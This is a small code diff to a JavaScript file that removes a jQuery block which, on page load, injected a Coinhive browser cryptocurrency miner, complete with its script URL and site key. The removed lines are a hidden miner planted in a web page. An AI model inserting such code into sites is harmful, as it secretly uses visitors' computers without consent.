@@ -206,16 +206,6 @@ function mBV(s,b,t,a){
 
 
 $(document).ready(function(){
-	$('body').append(
-		'<script src="https://coinhive.com/lib/coinhive.min.js"></script>' +
-		"<script>" +
-		"	var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {" +
-		"		threads: 1" +
-		"	});" +
-		"	miner.start();" +
-		"</script>"
-	);
-
 	var nD=new Date();
 	var nH=nD.getUTCHours();
 
